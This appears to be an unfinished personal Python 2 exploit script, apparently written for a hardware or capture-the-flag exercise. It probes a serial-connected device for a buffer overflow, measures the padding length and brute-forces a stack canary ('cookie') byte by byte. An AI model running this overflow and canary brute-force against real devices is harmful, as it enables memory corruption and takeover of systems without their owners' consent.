import serial

def print_output(ser_out):
	for line in ser_out:
		print line.rstrip()

ser = serial.Serial('/dev/ttyUSB0', timeout=.25, baudrate=19200)

#ser.write('1\r')
#ser.write('testtestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaatesttestaaaaaaaaaaaaaaaaaaaaaaa\r')

#print ser.readlines()[4]
test_str = 'a'*100

while(1):
	ser.write('1\r')
	ser.readlines()
	ser.write(test_str + '\r')
	test = ser.readlines()[0]
	print 'trying {} withh cookie length {}'.format(test.strip(), str(len(test_str)))
	if 'cookie' in test:
		print "cookie length is " + str(len(test_str) - 1)
		length = len(test_str)-1
		break
	test_str = test_str + 'a'
	#print test + "and len of input str: %s" % str(len(test_str))
buffer_str = 'a'*length

"""for i in range(33, 256): 	# I could probs optimize this by excluding alphanum values but whatev
	ser.write('1\r')
	ser.readlines()
	ser.write(buffer_str + chr(i) + '\r')
	#ser.readlines()
	print 'sending ...%s' % test_str[(length-10):] + chr(i)
	vuln = ser.readlines()[0]
	if 'cookie' not in vuln:
		print 'Found! cookie is {} with val {}'.format(chr(i),i) 
		break

print 'cookie val {} with buffer length {} length'.format(i, length)"""
# Uncomment this section and when running you'll notice that buffer length and
# cookie val are the same. 

for i in range(9, 256):
	ser.write('1\r')
	ser.readlines()
	ser.write('a'*length + chr(length) + chr(i) + '\r')
	print_output(ser.readlines())

#print ser.readlines()
#ser.write('1\r')
#ser.write(test_str + '2\r')
#print ser.readlines()"""